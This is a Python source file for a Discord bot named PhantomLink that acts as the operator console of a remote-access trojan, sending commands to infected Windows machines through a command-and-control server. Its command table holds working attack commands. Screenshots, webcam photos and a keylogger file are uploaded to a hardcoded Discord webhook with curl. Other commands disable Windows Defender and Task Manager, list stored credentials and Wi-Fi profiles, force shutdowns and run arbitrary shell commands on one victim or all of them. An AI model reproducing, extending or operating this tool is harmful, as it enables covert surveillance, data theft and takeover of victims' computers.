"""
PhantomLink Discord Bot
Full command support - connects to C2 server to relay commands
Type !commands in Discord to see all available commands
"""

import discord
import asyncio
import sys
import io
import socket
import json
import urllib.request
import urllib.error
import struct
import threading
import time

if __name__ == "__main__":
    if hasattr(sys.stdout, "buffer") and getattr(sys.stdout, "encoding", "").lower() != "utf-8":
        sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', errors='replace')
import os

DISCORD_BOT_TOKEN = os.getenv("PHANTOMLINK_BOT_TOKEN", "")
DISCORD_CHANNEL_ID = 1525081606501568577
DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1525081864094613615/4DkAojzJaoqsbolWR2E59IVwWeZY21CVr4-eNcnvXWB2nAKad4wpQ3mZVddNnNlw8pV7"

# C2 Server config
C2_HOST = "127.0.0.1"
C2_PORT = 5000
API_PORT = 5001
API_KEY = "PhantomLink-API-2026"  # Must match C2 server API_KEY
TARGET_CLIENT = "all"


intents = discord.Intents.default()
intents.message_content = True

client = discord.Client(intents=intents)


# ═══════════════════════════════════════════════════════
# C2 Communication Helper
# ═══════════════════════════════════════════════════════

class C2Connection:
    """Handles communication with the C2 server to relay commands to clients"""

    def __init__(self):
        self.socket = None
        self.connected = False
        self.lock = threading.Lock()

    def _send_message(self, conn, data):
        try:
            if isinstance(data, str):
                data = data.encode('utf-8')
            msg_len = len(data)
            conn.sendall(struct.pack('!I', msg_len))
            conn.sendall(data)
            return True
        except Exception:
            return False

    def _recv_message(self, conn):
        try:
            raw_msglen = self._recv_exactly(conn, 4)
            if not raw_msglen:
                return None
            msglen = struct.unpack('!I', raw_msglen)[0]
            if msglen > 10 * 1024 * 1024:
                return None
            return self._recv_exactly(conn, msglen)
        except Exception:
            return None

    def _recv_exactly(self, conn, n):
        data = b''
        while len(data) < n:
            try:
                packet = conn.recv(n - len(data))
                if not packet:
                    return None
                data += packet
            except Exception:
                return None
        return data


c2 = C2Connection()


# ═══════════════════════════════════════════════════════
# Simple commands that need NO extra input from user
# (just send the command directly to client)
# ═══════════════════════════════════════════════════════

SIMPLE_COMMANDS = {
    'screenshot': {
        'description': '📷 Take screenshot and send to Discord',
        'commands': [
            'powershell -command "'
            'Add-Type -AssemblyName System.Windows.Forms; '
            'Add-Type -AssemblyName System.Drawing; '
            '$bmp = New-Object Drawing.Bitmap([System.Windows.Forms.SystemInformation]::VirtualScreen.Width, '
            '[System.Windows.Forms.SystemInformation]::VirtualScreen.Height); '
            '$graphics = [Drawing.Graphics]::FromImage($bmp); '
            '$graphics.CopyFromScreen([System.Windows.Forms.SystemInformation]::VirtualScreen.X, '
            '[System.Windows.Forms.SystemInformation]::VirtualScreen.Y, 0, 0, $bmp.Size); '
            '$path = Join-Path $env:USERPROFILE \\"screenshot.png\\"; '
            '$bmp.Save($path)"',
            f'curl -F "file=@%USERPROFILE%\\screenshot.png" -F "content=Screenshot" {DISCORD_WEBHOOK}'
        ]
    },
    'rickroll': {
        'description': '🎵 Rick Roll the client',
        'commands': ['start https://www.youtube.com/watch?v=dQw4w9WgXcQ']
    },
    'sys': {
        'description': '🖥️ Show system info',
        'commands': ['systeminfo']
    },
    'task': {
        'description': '📋 Show running tasks',
        'commands': ['tasklist']
    },
    'clipboard': {
        'description': '📎 Show clipboard content',
        'commands': ['powershell -command "Get-Clipboard"']
    },
    'ip': {
        'description': '🌐 Get public IP',
        'commands': ['powershell -Command "(Invoke-WebRequest -uri \'https://api.ipify.org\').Content"']
    },
    'lock': {
        'description': '🔒 Lock screen',
        'commands': ['rundll32.exe user32.dll,LockWorkStation']
    },
    'sleep': {
        'description': '💤 Put PC to sleep',
        'commands': ['rundll32.exe powrprof.dll,SetSuspendState 0,1,0']
    },
    'shutdown': {
        'description': '⏹️ Force shutdown',
        'commands': ['shutdown /s /f /t 0']
    },
    'restart': {
        'description': '🔄 Force restart',
        'commands': ['shutdown /r /f /t 0']
    },
    'recycle': {
        'description': '🗑️ Empty recycle bin',
        'commands': ['PowerShell.exe -NoProfile -Command Clear-RecycleBin -Force']
    },
    'devices': {
        'description': '🎥 List available devices (cameras/mics)',
        'commands': ['"%USERPROFILE%/ffmpeg/bin/ffmpeg.exe" -list_devices true -f dshow -i dummy']
    },
    'wifi': {
        'description': '📶 Show saved Wi-Fi profiles',
        'commands': ['netsh wlan show profiles']
    },
    'killav': {
        'description': '🛡️ Disable Windows Defender',
        'commands': [
            'powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"',
            'taskkill /F /IM MsMpEng.exe'
        ]
    },
    'keylog': {
        'description': '⌨️ Send keylogger log file',
        'commands': [
            f'curl -F "file=@%USERPROFILE%\\AppData\\Roaming\\MicrosoftUpdate\\keylog.txt" -F "content=Keylog" {DISCORD_WEBHOOK}'
        ]
    },
    'netscan': {
        'description': '🔍 Scan local network',
        'commands': [
            'powershell -Command "1..254 | ForEach-Object { $ip = \\"192.168.1.$_\\"; if(Test-Connection -ComputerName $ip -Count 1 -Quiet) { \\"$ip - $(Resolve-DnsName $ip -ErrorAction SilentlyContinue).NameHost\\" } }"'
        ]
    },
    'info': {
        'description': 'ℹ️ Get machine info',
        'commands': [
            'powershell -Command "Get-ComputerInfo | Select OSName,OSVersion,WindowsVersion,CSName,CSDomain,BIOSManufacturer | Format-List; Get-WmiObject Win32_Battery | Select EstimatedChargeRemaining"'
        ]
    },
    'creds': {
        'description': '🔑 Get Windows credentials',
        'commands': ['cmdkey /list']
    },
    'disable_taskmgr': {
        'description': '🚫 Disable Task Manager',
        'commands': [r'REG ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f']
    },
    'enable_taskmgr': {
        'description': '✅ Enable Task Manager',
        'commands': [r'REG DELETE HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /f']
    },
}

# Commands that need one parameter: !cmd <param>
PARAM_COMMANDS = {
    'camera': {
        'description': '📸 Take camera photo (usage: `!camera <device_name>`)',
        'param_name': 'camera device name',
        'build': lambda cam: [
            f'powershell -Command "Start-Process \\"%USERPROFILE%\\ffmpeg\\bin\\ffmpeg.exe\\" '
            f'-ArgumentList \'-f dshow -y -i video=\\"{cam}\\" -frames:v 1 -update 1 \\"$env:USERPROFILE\\webcam.jpg"\' '
            f'-NoNewWindow -Wait"',
            f'curl -F "file=@%USERPROFILE%/webcam.jpg" -F "content=Webcam" {DISCORD_WEBHOOK}'
        ]
    },
    'alert': {
        'description': '⚠️ Send popup alert (usage: `!alert <message>`)',
        'param_name': 'message',
        'build': lambda msg: [
            f"powershell -Command \"Add-Type -AssemblyName Microsoft.VisualBasic; [Microsoft.VisualBasic.Interaction]::MsgBox('{msg}', 'Critical', 'PhantomLink')\""
        ]
    },
    'wallpaper': {
        'description': '🖼️ Change wallpaper (usage: `!wallpaper <full_path>`)',
        'param_name': 'image path',
        'build': lambda path: [
            f'reg add "HKCU\\Control Panel\\Desktop" /v Wallpaper /t REG_SZ /d "{path}" /f && RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters'
        ]
    },
    'rotate': {
        'description': '🔄 Rotate screen (usage: `!rotate up/down/left/right`)',
        'param_name': 'direction',
        'build': lambda d: [
            f"powershell -Command \"(New-Object -ComObject WScript.Shell).SendKeys('^%{{{d.upper()}}}')\"" if d.lower() in ['up', 'down', 'left', 'right'] else None
        ]
    },
    'type': {
        'description': '⌨️ Type text on client (usage: `!type <text>`)',
        'param_name': 'text',
        'build': lambda text: [
            f"powershell -Command \"$wsh = New-Object -ComObject WScript.Shell; $wsh.SendKeys('{text}')\""
        ]
    },
    'hide': {
        'description': '👻 Hide file/folder (usage: `!hide <path>`)',
        'param_name': 'path',
        'build': lambda path: [f'attrib +h +s "{path}"']
    },
}


@client.event
async def on_ready():
    print(f"[OK] Bot is online: {client.user}")
    print(f"[*] Listening on channel: {DISCORD_CHANNEL_ID}")
    print(f"[*] Type !commands in Discord to see all commands")

    channel = client.get_channel(DISCORD_CHANNEL_ID)
    if not channel:
        try:
            channel = await client.fetch_channel(DISCORD_CHANNEL_ID)
        except Exception as e:
            print(f"[!] Error fetching channel: {e}")
            return

    cmd_list = "\n".join([f"`!{k}` - {v['description']}" for k, v in SIMPLE_COMMANDS.items()])
    param_list = "\n".join([f"`!{k}` - {v['description']}" for k, v in PARAM_COMMANDS.items()])

    await channel.send(
        f"🟢 **PhantomLink Bot Online!**\n\n"
        f"**Quick Commands:**\n{cmd_list}\n\n"
        f"**Parameter Commands:**\n{param_list}\n\n"
        f"`!ping` - ทดสอบ\n"
        f"`!stop` - ปิด Bot\n"
        f"`!clients` - แสดง client ทั้งหมด\n"
        f"`!select <id>` - เลือกเป้าหมาย\n"
        f"`!commands` - แสดงคำสั่งทั้งหมด\n"
        f"`!cmd <command>` - รันคำสั่ง CMD โดยตรง"
    )
    print("[OK] Sent online message to channel")


@client.event
async def on_message(message):
    global TARGET_CLIENT
    if message.author == client.user:
        return

    if message.channel.id != DISCORD_CHANNEL_ID:
        return

    content = message.content.strip()
    content_lower = content.lower()


    # ── !clients ──
    if content_lower == "!clients":
        try:
            req = urllib.request.Request(f"http://{C2_HOST}:{API_PORT}/api/clients")
            req.add_header('X-API-Key', API_KEY)
            with urllib.request.urlopen(req, timeout=10) as response:
                data = json.loads(response.read())
                clients = data.get('clients', [])
                if not clients:
                    await message.channel.send("📭 No clients connected.")
                else:
                    msg = "📋 **Connected Clients:**\n"
                    for c in clients:
                        msg += f"ID: `{c['id']}` - `{c['username']}` @ `{c['ip']}`\n"
                    await message.channel.send(msg)
        except Exception as e:
            await message.channel.send(f"❌ Error getting clients: {e}")

    # ── !select ──
    elif content_lower.startswith("!select"):
        parts = content_lower.split()
        if len(parts) == 1:
            TARGET_CLIENT = "all"
            await message.channel.send("✅ Target set to **ALL clients**")
        else:
            TARGET_CLIENT = parts[1]
            await message.channel.send(f"✅ Target set to **Client ID {TARGET_CLIENT}**")

    # ── !ping ──
    elif content_lower == "!ping":
        await message.channel.send("🏓 **Pong!** Bot ตอบกลับได้สำเร็จ!")
        print(f"[OK] Responded to !ping from {message.author}")

    # ── !stop ──
    elif content_lower == "!stop":
        await message.channel.send("🔴 **Bot shutting down...**")
        print("[*] Stopping bot...")
        await client.close()

    # ── !commands ──
    elif content_lower == "!commands":
        cmd_text = "📋 **PhantomLink Commands**\n\n"

        cmd_text += "**📁 Simple Commands (no parameters):**\n"
        for k, v in SIMPLE_COMMANDS.items():
            cmd_text += f"`!{k}` - {v['description']}\n"

        cmd_text += "\n**🔧 Parameter Commands:**\n"
        for k, v in PARAM_COMMANDS.items():
            cmd_text += f"`!{k}` - {v['description']}\n"

        cmd_text += "\n**🛠️ Other:**\n"
        cmd_text += "`!ping` - ทดสอบการเชื่อมต่อ\n"
        cmd_text += "`!stop` - ปิด Bot\n"
        cmd_text += "`!clients` - แสดง client ทั้งหมด\n"
        cmd_text += "`!select <id>` - เลือกเป้าหมาย\n"
        cmd_text += "`!cmd <command>` - รันคำสั่ง CMD โดยตรง\n"
        cmd_text += "`!broadcast <command>` - ส่งคำสั่งไปทุก client\n"

        # Split if too long
        if len(cmd_text) > 2000:
            parts = [cmd_text[i:i+1900] for i in range(0, len(cmd_text), 1900)]
            for part in parts:
                await message.channel.send(part)
        else:
            await message.channel.send(cmd_text)

    # ── Simple commands (no parameters) ──
    elif content_lower.lstrip("!") in SIMPLE_COMMANDS:
        cmd_key = content_lower.lstrip("!")
        cmd_info = SIMPLE_COMMANDS[cmd_key]
        await message.channel.send(f"⏳ Executing `!{cmd_key}`...")
        print(f"[*] Executing !{cmd_key} from {message.author}")

        # Send commands to all connected clients via C2
        result = await send_commands_to_clients(cmd_info['commands'])
        if result:
            # Truncate if too long
            if len(result) > 1900:
                result = result[:1900] + "\n... (truncated)"
            await message.channel.send(f"✅ **{cmd_key}** result:\n```\n{result}\n```")
        else:
            await message.channel.send(f"✅ **{cmd_key}** - Command sent! (check Discord webhook for files)")

    # ── Parameter commands ──
    elif content_lower.startswith("!") and content_lower.split()[0].lstrip("!") in PARAM_COMMANDS:
        parts = content.split(maxsplit=1)
        cmd_key = parts[0].lstrip("!").lower()
        cmd_info = PARAM_COMMANDS[cmd_key]

        if len(parts) < 2:
            await message.channel.send(f"❌ Missing parameter: `{cmd_info['param_name']}`\n{cmd_info['description']}")
            return

        param = parts[1]
        commands = cmd_info['build'](param)
        commands = [c for c in commands if c is not None]

        if not commands:
            await message.channel.send(f"❌ Invalid parameter: `{param}`")
            return

        await message.channel.send(f"⏳ Executing `!{cmd_key} {param}`...")
        print(f"[*] Executing !{cmd_key} {param} from {message.author}")

        result = await send_commands_to_clients(commands)
        if result:
            if len(result) > 1900:
                result = result[:1900] + "\n... (truncated)"
            await message.channel.send(f"✅ **{cmd_key}** result:\n```\n{result}\n```")
        else:
            await message.channel.send(f"✅ **{cmd_key}** - Command sent!")

    # ── !cmd <raw command> ──
    elif content_lower.startswith("!cmd "):
        raw_cmd = content[5:].strip()
        if not raw_cmd:
            await message.channel.send("❌ Usage: `!cmd <command>`")
            return

        await message.channel.send(f"⏳ Running: `{raw_cmd[:100]}`...")
        print(f"[*] Raw CMD from {message.author}: {raw_cmd}")

        result = await send_commands_to_clients([raw_cmd])
        if result:
            if len(result) > 1900:
                result = result[:1900] + "\n... (truncated)"
            await message.channel.send(f"```\n{result}\n```")
        else:
            await message.channel.send("✅ Command sent (no output)")

    # ── !broadcast <raw command> ──
    elif content_lower.startswith("!broadcast ") or content_lower == "!broadcast":
        parts = content.split(maxsplit=1)
        if len(parts) < 2:
            await message.channel.send("❌ Usage: `!broadcast <command>`")
            return

        raw_cmd = parts[1].strip()
        await message.channel.send(f"📢 **Broadcasting to ALL clients:** `{raw_cmd[:100]}`...")
        print(f"[*] Broadcast CMD from {message.author}: {raw_cmd}")

        orig_target = TARGET_CLIENT
        try:
            TARGET_CLIENT = "all"
            result = await send_commands_to_clients([raw_cmd])
        finally:
            TARGET_CLIENT = orig_target

        if result:
            if len(result) > 1900:
                result = result[:1900] + "\n... (truncated)"
            await message.channel.send(f"```\n{result}\n```")
        else:
            await message.channel.send("✅ Broadcast command sent (no output)")


    # ── Unknown command ──
    elif content.startswith("!"):
        cmd_name = content.split()[0]
        await message.channel.send(
            f"❓ Unknown command: `{cmd_name}`\n"
            f"Use `!commands` to see all available commands"
        )


async def send_commands_to_clients(commands):
    """Send commands to connected C2 clients and return combined output"""
    try:
        loop = asyncio.get_running_loop()
        result = await loop.run_in_executor(None, _send_commands_sync, commands)
        return result
    except Exception as e:
        print(f"[!] Error sending commands: {e}")
        return f"[Error: {e}]"



def _check_c2_server():
    """Check if C2 API server is running before sending commands"""
    try:
        req = urllib.request.Request(f"http://{C2_HOST}:{API_PORT}/api/status")
        req.add_header('X-API-Key', API_KEY)
        with urllib.request.urlopen(req, timeout=5) as response:
            data = json.loads(response.read())
            return data.get('status') == 'ok'
    except Exception:
        return False


def _send_commands_sync(commands):
    """Synchronous version - connects to C2 API and sends commands"""
    # Check if C2 server is running first
    if not _check_c2_server():
        return (
            "[!] ❌ C2 Server ไม่ได้เปิดอยู่!\n"
            "[!] กรุณาเปิด C2 Server ก่อนใช้คำสั่ง\n"
            f"[!] ต้องรัน C2.py บน {C2_HOST}:{C2_PORT} ก่อน"
        )

    try:
        url = f"http://{C2_HOST}:{API_PORT}/api/command"
        headers = {'Content-Type': 'application/json', 'X-API-Key': API_KEY}
        results_str = ""
        
        for cmd in commands:
            data = json.dumps({'command': cmd, 'target': TARGET_CLIENT}).encode('utf-8')
            req = urllib.request.Request(url, data=data, headers=headers)
            try:
                with urllib.request.urlopen(req, timeout=30) as response:
                    res_data = json.loads(response.read())
                    res_list = res_data.get('results', [])
                    if not res_list:
                        if TARGET_CLIENT == 'all':
                            results_str += "[!] ❌ ไม่มี client เชื่อมต่ออยู่เลย (No clients connected)\n"
                        else:
                            results_str += f"[!] ❌ ไม่พบเป้าหมาย ID: {TARGET_CLIENT} (Client may have disconnected)\n"
                    for r in res_list:
                        cid = r.get('client_id')
                        status = r.get('status')
                        output = r.get('output')
                        user = r.get('username')
                        user_info = f" ({user})" if user else ""
                        if status == 'not_found':
                            results_str += f"[Client {cid}] ❌ Status: Not Found (Disconnected)\n"
                        else:
                            if output:
                                results_str += f"[Client {cid}{user_info}] Status: {status}\n{output}\n"
                            else:
                                results_str += f"[Client {cid}{user_info}] Status: {status}\n"
            except urllib.error.URLError as e:
                results_str += f"[!] C2 Server connection error: {e.reason}\n"
            except Exception as e:
                results_str += f"[!] API error: {e}\n"
                
        return results_str

    except Exception as e:
        return f"[!] Error communicating with C2 API: {e}"




async def main():
    try:
        await client.start(DISCORD_BOT_TOKEN)
    except discord.LoginFailure:
        print("[!] Invalid Bot Token!")
    except Exception as e:
        print(f"[!] Error: {e}")


if __name__ == "__main__":
    print("[*] Starting PhantomLink Discord Bot...")
    asyncio.run(main())
